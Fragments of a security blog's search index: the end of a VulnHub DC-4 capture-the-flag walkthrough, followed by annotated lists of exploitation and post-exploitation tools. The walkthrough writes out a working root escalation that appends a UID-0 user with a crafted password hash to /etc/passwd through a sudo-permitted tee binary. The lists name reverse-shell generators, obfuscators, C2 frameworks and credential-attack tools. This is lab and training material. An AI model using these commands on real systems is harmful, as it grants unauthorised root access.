","date":"02-14-2024","objectID":"/dc-4/:12:0","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"Rooting DC-4 Let’s see if charles provides us more privs over DC-4! Maybe it’ll provide us an opportunity to root DC-4. ","date":"02-14-2024","objectID":"/dc-4/:13:0","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"Access as charles Since we already have a SSH session established, we can attempt to access charles by using the su command. su allows the current session to become another user. To switch to charles, we’d run su charles. If you left charles out of the command and ran su alone, it would default to superuser(root). So run, su charles and plugin the password found in the “jim” mbox file. Yet another lateral move on DC-4! charles - access to DC-4 ","date":"02-14-2024","objectID":"/dc-4/:13:1","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"Abusing charle’s privileges First thing first, run sudo -l to list out any sudo privs charles may have on DC-4. We have authorization to run the binary /usr/bin/teehee with root privs. Funny as it seems the DC-4 creator renamed or created a new binary based on the original binary named tee. charles - root privs running teehee tee is a binary used in many operating systems and takes standard input and writes to both standard output and file(s). The name comes from its operation scheme. Reassessing the situation, sudo is configured to allow charles run permissions on binary /usr/bin/teehee with root privilege. A simple and effective privilege escalation attack would be to abuse this sudo configuration and use teehee to append a new user into the /etc/passwd file, granting us root privileges on DC-4. ","date":"02-14-2024","objectID":"/dc-4/:13:2","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"Appending new user into /etc/passwd Let’s check if openssl is present on DC-4 by running which openssl. Yep, it is! charles - which openssl Next we want to create a hashed password with openssl. /etc/passwd requires it to be a MD5 format with the salt being the username. Edit the following command, run it on your attackbox or DC-4, and then copy the output to clipboard: openssl passwd -1 -salt \"\u003cusername\u003e\" \"\u003cpassword\u003e\" passwd - tells openssl to compute the hash of a password -1 - uses MD5 algorithm -salt \"imroot\" - salts the password with the value “imroot”, which is the username I’ve chosen revsh3ll - the password chosen for the user “imroot”, which I’ll append to /etc/passwd charles - openssl output Now with a salted MD5 password, we can append it to the /etc/passwd file in linux using the tee binary. Normally when adding a new user to a linux system, non-system UserIDs start at 1000 and this would normally be done by running adduser \u003cusername\u003e. Since we have root privs to tee, we’ll be adding a user with a UserID of 0(zero). This will allow us to gain root privs on DC-4. ","date":"02-14-2024","objectID":"/dc-4/:13:3","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"Pwn DC-4 Here’s a one-liner using the following creds: imroot:revsh3ll echo 'imroot:$1$imroot$1dH55UU8nz7m..Li4V7Zj0:0:0:root:/root:/bin/bash' | sudo /usr/bin/teehee -a /etc/passwd echo - echo the string to be appended to /etc/passwd 'imroot:$1$imroot$1dH55UU8nz7m..Li4V7Zj0:0:0:root:/root:/bin/bash' - string to be appended format = username:saltedMD5password:UserID:GroupID:homedirectory:shell | - pipes the echo command into /usr/bin/teehee binary sudo /usr/bin/teehee -a /etc/passwd - takes in standard input of our echo’d value and runs teehee, with root privs, and appends(-a) it to /etc/passwd DC-4 - ROOTED!! Below I included a screenshot of the /etc/passwd contents, after appending the user “imroot”. DC-4 - /etc/passwd ","date":"02-14-2024","objectID":"/dc-4/:13:4","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"Quick Summary DC-4 provided a look into how an adversary could compromise a web server due to misconfigurations and poor password management. Step 1 - Lack of a authentication lockout policy, along with poor password management, allowed the attacker unrestricted brute-force attempts against an exposed devops login panel. With time and little effort, the attacker successfully logged in as an administrator, allowing access to a “command.php” tool. Step 2 - With no user input validation, sanitization, and poor coding via the use of the PHP “shell_exec” function, command.php provided the attacker with unrestricted code injection. With this vulnerability, a reverse shell was established as a low-level user “www-data”, providing the attacker direct access with the linux operating system. Step 3 - Within only a few minutes, the attacker found unsecure credentials in the home folder of the user “jim”. With read privileges, as the user www-data, the attacker extracted a list of clear text passwords. With no key-based authentication or MFA required, the attacker moved laterally through SSH, to a user named jim, by automating SSH logins using the found list of clear text passwords. Step 4 - With access as the user jim, the attacker found an unencrypted email containing the password of the user charles. After laterally moving to the user charles, the attacker found the final path to compromising the system by abusing sudo. Step 5 - As the user charles, the attacker found the binary “tee” to be executable as root, through sudo, which allowed the attacker to gain root privileges on DC-4. This privilege escalation attack works by appending a new root user onto the /etc/passwd file, ultimately giving the attacker full control of DC-4. Onto DC-5. Bring me a challenge! ","date":"02-14-2024","objectID":"/dc-4/:14:0","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["Resources \u0026 Tools"],"content":" Post-Exploitation Abusing vulnerabilities and misconfigurations to maintain access, escalate privileges, and/or exfiltrate sensitive data. With our initial access to an internal network, we now focus on acquiring higher-level access through privilege escalation, pivoting to other hosts through lateral movement, stealing sensitive information through data exfiltration, and maintaining access through persistent methods. Few examples: Abusing misconfigurations in Active Directory, internal services, and/or hosts to gain new privileges and access. Bypassing egress filtering through tunneling methods. Disabling and/or bypassing AV solutions. Stealing sensitive information from compromised hosts. Creating persistence to ease our access back into the compromised network/host. This is a list of tools which use exploitation techniques (E.g., Abusing remote services, applications, valid accounts, and more) to gain access to the target. Exploit Warning! Use caution when downloading and/or executing any malicious code! I’m not responsible for your actions. Only attack systems you have written authorization to! Regarding my notes: The brackets ( ) after each tool will indicate if the tool is: (Built-in) = Within Kali’s repo. If not already installed, run the following: sudo apt update \u0026\u0026 sudo apt install *tool-to-install* (External) = Outside Kali’s repo. It’ll need downloaded then installed. (Website) = Part of a website. There’s others but they’re self-explanatory. I’ll also try specifying any restrictions I know of. API access needed. Paywalls. etc. ","date":"02-14-2024","objectID":"/post-exploitation/:0:0","tags":["Post-Exploitation","Tools","Pivoting","Proxies","Enumeration","Resources","Exploitation","Lateral Movement","Vertical Movement","Persistence","Collection","Exfiltration","Scanning","Active Directory","Privilege Escalation"],"title":"Post Exploitation Resources","uri":"/post-exploitation/"},{"categories":["Resources \u0026 Tools"],"content":"AIO Resources HackingArticles.in - (Website) Quick and simple walkthrough guides to various tools and techniques. HackTricks - (Website) Great resources for anything penetration testing and red teaming. 0xJs RedTeam CheatSheet - (GitHub Repo) CheatSheet to anything Red Team. SwissKy - (GitHub Repo) AIO repo focusing on webapp payloads but includes many other pentesting \u0026 red teaming resources. Home for the popular PayLoadAllTheThings repo. The Hive - (Website) Great resource to search and learn from. Holds many resources that other blogs may lack. Overall great to keep in your notes. ","date":"02-14-2024","objectID":"/post-exploitation/:1:0","tags":["Post-Exploitation","Tools","Pivoting","Proxies","Enumeration","Resources","Exploitation","Lateral Movement","Vertical Movement","Persistence","Collection","Exfiltration","Scanning","Active Directory","Privilege Escalation"],"title":"Post Exploitation Resources","uri":"/post-exploitation/"},{"categories":["Resources \u0026 Tools"],"content":"Active Directory ","date":"02-14-2024","objectID":"/post-exploitation/:2:0","tags":["Post-Exploitation","Tools","Pivoting","Proxies","Enumeration","Resources","Exploitation","Lateral Movement","Vertical Movement","Persistence","Collection","Exfiltration","Scanning","Active Directory","Privilege Escalation"],"title":"Post Exploitation Resources","uri":"/post-exploitation/"},{"categories":["Resources \u0026 Tools"],"content":"AD Enumeration adidnsdump - (External) “Active Directory Integrated DNS dumping by any authenticated user”. Great for initial recon once an AD creds acquired. BloodHound - (Built-in) Ingests Sharphound/PowerView output and presents AD object relations in a graph-theory approach. enum4linux-ng - (Built-in) Provides Windows/Samba Enumeration. Newer version of the older enum4linux. Kerbrute - (External) Kerberos pre-auth bruteforcer. Wonderful tool for enumerating unknown and valid users! Also does password spraying! ldapdomaindump - (External) Collects and parses info available through LDAP then dumps into a human readable HTML format. Also supports json and csv,tsv. ldapsearch - (Built-in) Connects, binds, and queries against the LDAP server. PowerView.ps1 - (Built-in) Active Directory enumeration Powershell script. Quick guide @ HarmJ0y’s PowerView-3.0-tricks. Thorough guide @ PowerSploit’s wiki. SharpHound - (External) Bloodhound collector. Three versions available: Sharphound.ps1 - PowerShell script for running Sharphound. However, the latest release of Sharphound has stopped releasing the Powershell script version. This version is good to use with RATs since the script can be loaded directly into memory, evading on-disk AV scans. Sharphound.exe - A Windows executable version for running Sharphound. AzureHound.ps1 - PowerShell script for running Sharphound for Azure (Microsoft Cloud Computing Services) instances. Bloodhound can ingest data enumerated from Azure to find attack paths related to the configuration of Azure Identity and Access Management. smbclient - (Built-in) Access SMB/CIFS resources on servers. “FTP-like” client. smbmap - (Built-in) Another tool that works well with enum4linux to enum SMB. Snaffler - (External) Automates the process of enumerating sensitive data dumps from AD file shares. ","date":"02-14-2024","objectID":"/post-exploitation/:2:1","tags":["Post-Exploitation","Tools","Pivoting","Proxies","Enumeration","Resources","Exploitation","Lateral Movement","Vertical Movement","Persistence","Collection","Exfiltration","Scanning","Active Directory","Privilege Escalation"],"title":"Post Exploitation Resources","uri":"/post-exploitation/"},{"categories":["Resources \u0026 Tools"],"content":"AD Exploits \u0026 Attacks CrackMapExec - (Built-in) “Swiss army knife of pentesting networks”. Attack AD networks via different protocols. Being replaced with NetExec. DomainPasswordSpray - (External) Powershell tool for password spraying from Windows host. Import-Module and run! Evil-WinRM - (Built-in) Have winrm creds, this will allow you to create a overpowered “evil”-winrm shell. Impacket - (Built-in) “Impacket is a collection of Python classes for working with network protocols.” Inveigh - (External) .NET version of responder, which can run from a Windows host. Great when doing a external to internal attack and need a LLMNR poisoner, among many other protocols. mimikatz - (Built-in) Various authentication attacks for the Windows environment. mitm6 - (External) “pwning IPv4 \u0026 IPv6” Takes advantage of misconfigured IPv6 in Windows AD environments. NetExec - (External) “The Network Execution Tool”. Replacement for CrackMapExec. noPac - RCE - (External) Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user. Won’t work if KB5008380 \u0026 KB5008602 are installed. PetitPotam - (External) Tools for Kerberos PKINIT and relaying to AD CS. PrintNightmare - RCE - (External) C# and Impacket implementation of PrintNightmare CVE-2021-1675/CVE-2021-34527. Responder - (Built-in) “Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication.” Rubeus - (External) Helps automate various Kerberos attacks, like kerboroasting. Part many AD tools @ GhostPack. ZeroLogon - (External) Tool to check if ZeroLogon in possible without exploiting(breaking) environment! ","date":"02-14-2024","objectID":"/post-exploitation/:2:2","tags":["Post-Exploitation","Tools","Pivoting","Proxies","Enumeration","Resources","Exploitation","Lateral Movement","Vertical Movement","Persistence","Collection","Exfiltration","Scanning","Active Directory","Privilege Escalation"],"title":"Post Exploitation Resources","uri":"/post-exploitation/"},{"categories":["Resources \u0026 Tools"],"content":"Pivoting Tools Chisel - (External) TCP/UDP tunnel over HTTP, secured via SSH, written in Golang. Supports authentication, auto-connect, quick speeds, etc. Requirements: Chisel binary on both compromised host and attackbox. plink - (External) On newer systems check for SSH first, then fallback to plink if needed. Always make sure you have the latest version. Requirements: plink.exe binary on compromised Windows host. proxychains4 - (Build-in) Only works with TCP protocol. Allows you to redirect connections through a SOCKS4/5 or HTTP proxies. You use this with e.g. chisel, ssh, etc. to create tunnels. socat - (Built-in or External) The relay king and considered a netcat on steroids. The syntax can be difficult but highly worth learning! Requirements: socat binary on compromised system. It’s a common found binary on linux systems. Windows binary can be found here: socat.exe. ssh - (Build-in) Flexible binary allowing file transfers, tunneling, port forwarding, proxying, etc. Requirements: SSH server configured for SSH client access. SShuttle - (External) Transparent Proxy, via SSH, as an interface. Acts like a VPN tunnel and Supports DNS tunneling. No admin privs required. Requirements: Linux Only. SSH and Python on compromised host. ","date":"02-14-2024","objectID":"/post-exploitation/:3:0","tags":["Post-Exploitation","Tools","Pivoting","Proxies","Enumeration","Resources","Exploitation","Lateral Movement","Vertical Movement","Persistence","Collection","Exfiltration","Scanning","Active Directory","Privilege Escalation"],"title":"Post Exploitation Resources","uri":"/post-exploitation/"},{"categories":["Resources \u0026 Tools"],"content":"Linux Local PrivEsc ","date":"02-14-2024","objectID":"/post-exploitation/:4:0","tags":["Post-Exploitation","Tools","Pivoting","Proxies","Enumeration","Resources","Exploitation","Lateral Movement","Vertical Movement","Persistence","Collection","Exfiltration","Scanning","Active Directory","Privilege Escalation"],"title":"Post Exploitation Resources","uri":"/post-exploitation/"},{"categories":["Resources \u0026 Tools"],"content":"Resources - Linux LPE Abusing SUDO for LPE - (Website) GotMilk’s Basic Linux PrivEsc guide - (Website) Compilation of TCM’s LPE course - (Website) HackTrick’s - Linux PrivEsc Checklist - (Website) swisskyrepo’s - Linux PrivEsc Resources - (Website) ","date":"02-14-2024","objectID":"/post-exploitation/:4:1","tags":["Post-Exploitation","Tools","Pivoting","Proxies","Enumeration","Resources","Exploitation","Lateral Movement","Vertical Movement","Persistence","Collection","Exfiltration","Scanning","Active Directory","Privilege Escalation"],"title":"Post Exploitation Resources","uri":"/post-exploitation/"},{"categories":["Resources \u0026 Tools"],"content":"Enumeration - Linux LPE LinEnum - (External) Scripted Local Linux Enumeration \u0026 Privilege Escalation Checks. LinPEAS - (External) Enumerates a Linux host for PrivEsc, etc. Linux Exploit Suggester - (External) Linux PrivEsc auditing tool. Linuxprivchecker.py - (External) “Linux Privilege Escalation Check Script”. Pspy - (External) “Monitor linux processes without root permissions”. ","date":"02-14-2024","objectID":"/post-exploitation/:4:2","tags":["Post-Exploitation","Tools","Pivoting","Proxies","Enumeration","Resources","Exploitation","Lateral Movement","Vertical Movement","Persistence","Collection","Exfiltration","Scanning","Active Directory","Privilege Escalation"],"title":"Post Exploitation Resources","uri":"/post-exploitation/"},{"categories":["Resources \u0026 Tools"],"content":"Attacks \u0026 Exploits - Linux LPE saleemrashid’s CVE-2019-18634 PoC - (External) Exploit for CVE-2019-18634. Needed: Sudo version \u003c 1.8.26 with pwfeedback enabled. DirtyCow - (External) DirtyCow kernel exploit. Simply transfer to target, compile, and run. GTFObins - (Website) Curated list of Unix binaries which assist in Unix LPE. Linux Kernel Exploits - (Github Repo) Older collection of kernel exploits by lucyoa. SSH Ket PRNG - (Website) “This module describes how to attempt to use an obtained authorized_keys file on a host system.” SUDO Killer - (External) “A tool designed to exploit a privilege escalation vulnerability in the sudo program on Unix-like systems. It takes advantage of a specific misconfiguration or flaw in sudo to gain elevated privileges on the system, essentially allowing a regular user to execute commands as the root user.” ","date":"02-14-2024","objectID":"/post-exploitation/:4:3","tags":["Post-Exploitation","Tools","Pivoting","Proxies","Enumeration","Resources","Exploitation","Lateral Movement","Vertical Movement","Persistence","Collection","Exfiltration","Scanning","Active Directory","Privilege Escalation"],"title":"Post Exploitation Resources","uri":"/post-exploitation/"},{"categories":["Resources \u0026 Tools"],"content":"Windows Local PrivEsc ","date":"02-14-2024","objectID":"/post-exploitation/:5:0","tags":["Post-Exploitation","Tools","Pivoting","Proxies","Enumeration","Resources","Exploitation","Lateral Movement","Vertical Movement","Persistence","Collection","Exfiltration","Scanning","Active Directory","Privilege Escalation"],"title":"Post Exploitation Resources","uri":"/post-exploitation/"},{"categories":["Resources \u0026 Tools"],"content":"Resources - Windows LPE Explained list of Potato attacks and associated links - (Website) Windows PrivEsc Guide by absolomb - (Website) swisskyrepo’s - Windows PrivEsc Guide - (Website) sushant747’s - Windows PrivEsc Guide - (Website) ","date":"02-14-2024","objectID":"/post-exploitation/:5:1","tags":["Post-Exploitation","Tools","Pivoting","Proxies","Enumeration","Resources","Exploitation","Lateral Movement","Vertical Movement","Persistence","Collection","Exfiltration","Scanning","Active Directory","Privilege Escalation"],"title":"Post Exploitation Resources","uri":"/post-exploitation/"},{"categories":["Resources \u0026 Tools"],"content":"Enumeration - Windows LPE PowerUp - (External) Powershell module for checking on PrivEsc. Seatbelt - (External) C# Windows enumeration tool. More granular WinPEAS… Precompiled Static Binaries. Part many AD tools @ GhostPack. SharpUp - (External) C# port of PowerUp functionality. WinPEAS - (External) Enumerate a Windows host for PrivEsc. Requires .NET 4.0 or higher. Windows Exploit Suggester - (External) This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins. Windows Exploit Suggester - (External) MSFconsole’s Windows exploit suggestion module. Sherlock - (Build-in) PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities. ","date":"02-14-2024","objectID":"/post-exploitation/:5:2","tags":["Post-Exploitation","Tools","Pivoting","Proxies","Enumeration","Resources","Exploitation","Lateral Movement","Vertical Movement","Persistence","Collection","Exfiltration","Scanning","Active Directory","Privilege Escalation"],"title":"Post Exploitation Resources","uri":"/post-exploitation/"},{"categories":["Resources \u0026 Tools"],"content":"Expoits \u0026 Attacks - Windows LPE Hot Potato - (External) Compatible with Windows 7, 8, 10, Server 2008, Server 2012. Local Privilege Escalation (LPE) abusing NBNS spoofing, NTLM relay, and WPAD proxy server. Juicy Potato - (External) “A sugared version of RottenPotatoNG, with a bit of juice, i.e. another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\\SYSTEM”. LOLBAS - (Website) Curated list of binaries and scripts which assist in Windows LPE. PrintNightmare - (External) Pure PowerShell implementation of CVE-2021-1675 Print Spooler Local Privilege Escalation (PrintNightmare). PrintSpoofer - (External) Abusing impersonation privileges through the “Printer Bug”. Server 2019 and Windows 10. Rotten Potato - (External) “RottenPotato local privilege escalation from service account to SYSTEM”. Authenticating attacker by tricking DCOM/RPC into using NTLM. Windows Kernel Exploits - (External) Curated list of Windows kernel exploits. ","date":"02-14-2024","objectID":"/post-exploitation/:5:3","tags":["Post-Exploitation","Tools","Pivoting","Proxies","Enumeration","Resources","Exploitation","Lateral Movement","Vertical Movement","Persistence","Collection","Exfiltration","Scanning","Active Directory","Privilege Escalation"],"title":"Post Exploitation Resources","uri":"/post-exploitation/"},{"categories":["Resources \u0026 Tools"],"content":" Exploitation Abusing misconfigurations and vulnerabilities to gain access to the target. In the exploitation phase, we’re researching and abusing found vulnerabilities and misconfigurations with the goal of gaining initial access to our target. Few examples: Abusing a poorly configured web app(E.g., injections, RCE, etc). Brute-forcing or abusing default credentials against login services (E.g., email portal, admin panel, VPNs, etc). Abusing remote services (VPN, RDP, etc). Exploiting unpatched and/or misconfigured services, apps, and hosts (E.g., Kernel vulnerabilities, host and app vulnerabilities and/or misconfigurations, etc). This is a list of tools which use exploitation techniques (E.g., Abusing remote services, applications, valid accounts, and more) to gain access to the target. Exploit Warning! Use caution when downloading and/or executing any malicious code! I’m not responsible for your actions. Regarding my notes: The brackets ( ) after each tool will indicate if the tool is: (Built-in) = Within Kali’s repo. If not already installed, run the following: sudo apt update \u0026\u0026 sudo apt install *tool-to-install* (External) = Outside Kali’s repo. It’ll need downloaded then installed. (Website) = Part of a website. There’s others but they’re self-explanatory. I’ll also try specifying any restrictions I know of. API access needed. Paywalls. etc. ","date":"11-29-2023","objectID":"/exploitation/:0:0","tags":["Exploitation","Initial Access","Tools","Resources","Defense Evasion"],"title":"Exploitation Resources","uri":"/exploitation/"},{"categories":["Resources \u0026 Tools"],"content":"C2 Frameworks Covenant - (Built-in) - Windows agents only. Built-In version may be outdated and is the kali repo package called “covenant-kbx”. How-To and details at Covenant’s Wiki. Based on .NET Core. Empire - (Built-in) - Windows, Linux, and Mac agents supported. C2 used after post-exploitation. MITRE ATT\u0026CK integration. How-To and Details at Empire’s Wiki. Client agents use: PowerShell, Python3, C#, and IronPython3. Modules use: AssemblyExecution, BOF Execution, Mimikatz, SeatBelt, Rubeus, SharpSploit, Certify, ProcessInjection, and many more. Metasploit - (Built-in) - Windows, Linux, and Mac agents supported. Penetration testing framework usable at any step of a penetration test. Some exploit-db exploits are integrated into the free version. Pro version integrates even more. Integrated exploits searchable via searchcommand. Differences of free and pro versions found at Rapid 7. Mythic - (Built-in) - Windows, Linux, and Mac agents supported. Many components but very flexible and collab friendly. Mythic documentation. Many operational pieces like MITRE ATT\u0026CK integration and screenshots. A list found here. TrevorC2 - (External) - Windows, Linux, and Mac agents supported. Obfuscation and encoding Client/Server model used for tunneling C2 traffic through a website. Client browser agent reads commands from a custom website’s body and sends results back to a server. Sliver - (Built-in) - Windows, Linux, and Mac agents supported. Server running Linux recommended. To allow metasploit integrates, server requires metasploit installation. MinGW package required if doing DLL payloads from a Linux server. Written in Golang, so server can run on a variety of platforms, but is larger in size. Simple to standup. ","date":"11-29-2023","objectID":"/exploitation/:0:1","tags":["Exploitation","Initial Access","Tools","Resources","Defense Evasion"],"title":"Exploitation Resources","uri":"/exploitation/"},{"categories":["Resources \u0026 Tools"],"content":"Exploits Databases \u0026 Forums 0x00sec - (Website) How-Tos, discussions, exploits, etc. 0day.today - (Website) Newer exploit database that competes with exploit-db.com. Buys and sells exploits. Exploit-DB - (Built-in \u0026 Website) Largest exploit DB and still reigns king. Locally stored and updated in Kali distribution (/usr/share/exploitdb/). CXSecurity DB - (Website) CXSecurity is buy only one person. Free database with PoCs for CVEs, etc. Hack Forums - (Website) Older, active forum. Rapid7 DB - (Website) - Premium tier may be required. Rapid7 database which links with metasploit updates. Snyk DB - (Website) Info and remediation guidance of known vulnerabilities. Shodan Exploits - (Website) Searches across many platforms for exploits. Packet Storm Files - (Website) Active forum posting exploits. Built to allow researchers share exploits. Vulners - (Website) Vulnerability Database and Search Engine Git Abuse GitTools - (External) Tools used to abuse git version control systems. (E.g. .git/). by downloading then restoring the repository .git folder granting source code access. Great for finding sensitive information in a misconfigured web server hosting Git. PoCs for CVEs PoC-in-GitHub - (GitHub Repo) GitHup repo which updates regularly with PoCs for the latest CVEs. Trickest Repo - (GitHub Repo) Another GitHup repo which updates regularly with PoCs for the latest CVEs. Search for PoCs GitHub Search - (Website) Seriously, you can find allot with GitHub search. Google - (Website) Seriously, you can find allot with Google. SearchSploit - (Built-in) CLI tool which searches local exploit-db database. Make sure to update your exploit-db for the latest before searching! ","date":"11-29-2023","objectID":"/exploitation/:0:2","tags":["Exploitation","Initial Access","Tools","Resources","Defense Evasion"],"title":"Exploitation Resources","uri":"/exploitation/"},{"categories":["Resources \u0026 Tools"],"content":"Passwords Attacks Hash Identification Hashcat’s hash example webpage - (Website) Example hashes with their related Hash-Mode number which is needed for option -m. hash-identifier - (Built-in) Helps identify different types of hashes used for data and password encryptions Online Password Attacks ncrack - (Built-in) High-speed network authentication cracking tool. Runs on Linux, *BSD, Windows, and Mac OS X. “Protocols supported include SSH, RDP, FTP, Telnet, HTTP(S), Wordpress, POP3(S), IMAP, CVS, SMB, VNC, SIP, Redis, PostgreSQL, MQTT, MySQL, MSSQL, MongoDB, Cassandra, WinRM, OWA, and DICOM” Patator - (Built-in) Written in Python and created out of the frustrations of using Hydra, Medusa, Ncrack, Metasploit modules and Nmap NSE scripts for password guessing attacks. Supported modules at link above. THC-Hydra - (Built-in) Parallelized login cracker supported many protocols. GUI binary is xhydra. THC Hydra comes with a handful of additional tools. Cool additional binary pw-inspector. You specify the minimum and maximum lengths then the wordlist and it’ll create a new wordlist based on lengths specified. Protocols supports includes: Cisco AAA, Cisco auth, Cisco enable, CVS, FTP, HTTP(S)-FORM-GET, HTTP(S)-FORM-POST, HTTP(S)-GET, HTTP(S)-HEAD, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MySQL, NNTP, Oracle Listener, Oracle SID, PC-Anywhere, PC-NFS, POP3, PostgreSQL, RDP, Rexec, Rlogin, Rsh, SIP, SMB(NT), SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP. Offline Password Attacks chntpw - (Built-in) From Linux, you can reset or blank out the local passwords by editing the SAM database which stores the Windows password hashes. Note: This only applies to local accounts and not email bound accounts. hashcat - (Built-in) “Advanced password recovery” Modules(-m) are what tells hashcat which algorithm to use against the hash you provide. My quick process is: Identifying the hash using hash-identifer. No results? Google it. Then I search via CLI hashcat --help | grep -e '\u003cexample-hash-name\u003e or hashcat’s examples webpage for the needed “Hash-Mode”. To list the many modes hashcat supports, run: hashcat --help | less +/'Hash modes' john the ripper - (Built-in) Popular offline cracking tool. Can cover more unique hashes than hashcat but hashcat has better GPU support. Includes many conversion tools, E.g. *2john, as it may need converted. Think of it like the extra step needed with hashcat’s -m options. Example scenario: You need to crack the passphrase of a SSH private key(RSA, DSA, OPENSSH, EC). ssh2john will convert this for john. ophcrack - (Built-in) Supports Windows NT, 2000, XP, VISTA, 7 hashes only. Uses rainbow tables to do cracking based on time-memory trade-off. Zip Password Crackers frackzip - (Built-in) Fast zip password cracker. Brute-force or dictionary based attacks. Can crack cpmask’d images too. rarcrack - (Built-in) Cracks .zip, .7z, and .rar. Brute-force only. zip2john module - (Built-in) zip2john example.zip \u003e example.zip.txt then sudo john --format=zip example.zip.txt. If rar format, same as before but --format=rar. ","date":"11-29-2023","objectID":"/exploitation/:0:3","tags":["Exploitation","Initial Access","Tools","Resources","Defense Evasion"],"title":"Exploitation Resources","uri":"/exploitation/"},{"categories":["Resources \u0026 Tools"],"content":"OS Distributions Create your own PTF (Penetration Testers Framework) - (GitHub Repo) Modules way of creating custom OS based on Debian, Arch, or Ubuntu. Malware Analysis FlareVM - (OS) Based on Windows. Includes scripts/tools to allow easy implementation of malware analysis environment. Pentest OSs CommandoVM - (OS) Based on Windows and born from FlareVM. Penetration and Red Teaming VM. Kali - (OS) Based on Debian Linux. Forensics \u0026 Pentesting OS. ParrotOS - (OS) Based on Debian. Pretty and quick GUI. ","date":"11-29-2023","objectID":"/exploitation/:0:4","tags":["Exploitation","Initial Access","Tools","Resources","Defense Evasion"],"title":"Exploitation Resources","uri":"/exploitation/"},{"categories":["Resources \u0026 Tools"],"content":"Scanners w/ exploits Network Scanners Nmap (Built-in) The “goto” network and port scanner with many capabilities beyond scanning via NSE. CMS Scanners CMSmap (External) CMSmap is a python open source CMS scanner that automates the process of detecting security flaws of the most popular CMSs. WPScan (Built-in) WPScan WordPress security scanner. Written for security professionals and blog maintainers to test the security of their WordPress websites. Specialized Scanners log4j-scan (External) A fully automated, accurate, and extensive scanner for finding log4j RCE CVE-2021-44228. Supports lists of URLs, 60+ HTTP headers, Bypass payloads for WAFs(Web Application Firewall), etc. ItWasAllADream (External) CVE-2021-34527 (PrintNightmare) RCE python scanner. Scan entire subnets for PrintNightmare RCE(Remote code execution) and export CVS report. Does NOT apply to LPE(Local privilege escalation)! Only RCE! ","date":"11-29-2023","objectID":"/exploitation/:0:5","tags":["Exploitation","Initial Access","Tools","Resources","Defense Evasion"],"title":"Exploitation Resources","uri":"/exploitation/"},{"categories":["Resources \u0026 Tools"],"content":"Shells, Payloads, \u0026 Obfuscation Shells and Payloads are easy to detect and most of the time you’ll need to obfuscate, encode, or use newer methods to compromise a host. Below are some basic resources. More can be found searching through the Additional Resources section. Shells \u0026 Payloads Groovy Language(Jenkins) (GitHub Repo) WebShell for Groovy Language, usually found on the Jenkins platform. MSFVenom (Built-in) Payload and encoding creation tool. Compliments Metasploit as it allows for meterpreter payloads. Easily picked up by many endpoint security, even Windows Defender. Reverse Cheat Sheet @ PayLoadAllTheThings (GitHub Repo) Many reverse shells. PentestMonkey’s Reverse Shells (Website) Short list of reverse shells. WebShells (GitHub Repo) Open repo to hosting webshells. As this repo is OPEN, carefully review all code for backdoors before executing! Shell Generators revshells.com (Website) Online generator of many reverse shells. Shellerator (External) Tool used to generate shell code locally. Reverse Shell Generator (Website) Online generator of many reverse shells. Obfuscators PHP Obfuscator - (Website) Online PHP obfuscator by Gaijin.at Helps hide malicious code by obfuscating it. Nishang’s Shells/Payloads (GitHub Repo) Powershell Scripts and Payloads used to bypass security through means of obfuscation, encoding, etc. Vulkan (External) Offensive tool to obfuscate powershell payloads. ","date":"11-29-2023","objectID":"/exploitation/:0:6","tags":["Exploitation","Initial Access","Tools","Resources","Defense Evasion"],"title":"Exploitation Resources","uri":"/exploitation/"},{"categories":["Resources \u0026 Tools"],"content":"Web Web App Proxy BurpSuite (Built-in) - Free version has rate limited brute-forcing. Paid version has many features. AIO web app security testing. Free community extensions can help improve the free version. Zed Attack Proxy (ZAP) (Built-in) Free and open-source web app scanner. No limit on brute-force attempts. Foxy Proxy (Browser Extension) Browser proxy used with ZAP and Burp. Web Code Analysis CyberChef - (Website \u0026 Self-hosted) “The Cyber Swiss Army Knife - a web app for encryption, encoding, compression and data analysis”. JSON Decode Online - (Website) Decode JSON cookies. URL Decode \u0026 Encode - (Website) Allows you to quickly decode or encode web shells, etc. Web Training bWAPP (buggy WebApp) - (External - Self-Hosted) Older but still effective when practicing the basics. OWASP “Juice Shop” - (External - Self-Hosted) OWASP created web server created to gamify(scoreboard) web security learning. Naturally it runs through the OWASP Top 10. PortSwigger Web Security Academy - (Website) Online web security training built from the creators of Burp Suite. Totally Insecure Web Application Project (TIWAP) - (External - Self-Hosted) Web App Security Lab made for learning and practicing web vulnerabilities. 